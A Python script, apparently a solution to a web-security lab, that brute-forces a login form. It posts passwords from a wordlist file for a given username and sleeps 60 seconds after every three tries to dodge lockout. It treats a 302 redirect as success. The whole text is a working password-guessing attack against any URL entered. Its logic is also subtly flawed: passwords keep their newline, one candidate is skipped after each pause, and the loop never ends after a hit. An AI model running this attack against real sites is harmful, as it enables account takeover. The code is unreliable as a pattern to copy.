import requests
import time

def solver(laburl,username):
    isActive = requests.get(laburl+'login').status_code
    if isActive == 200:
        counter = 1
        time.sleep(30)
        while True:
            with open('creds.txt','r') as file:
                for words in file:
                    attemptPass=words
                    if counter <= 3 :
                        data = f"username={username}&password={attemptPass}"
                        brute_req = requests.post(url=laburl+'login',data=data).status_code
                        print(f'Trying password {attemptPass} => {brute_req}')
                        print(counter)
                        if brute_req == 302:
                            print(f"Found Password {attemptPass}")
                            break
                        else:
                            counter +=1
                    else:
                        time.sleep(60)
                        counter =1



 
url = str(input("Enter the URL "))
username = str(input("Enter the UserName "))

solver(laburl=url,username=username)
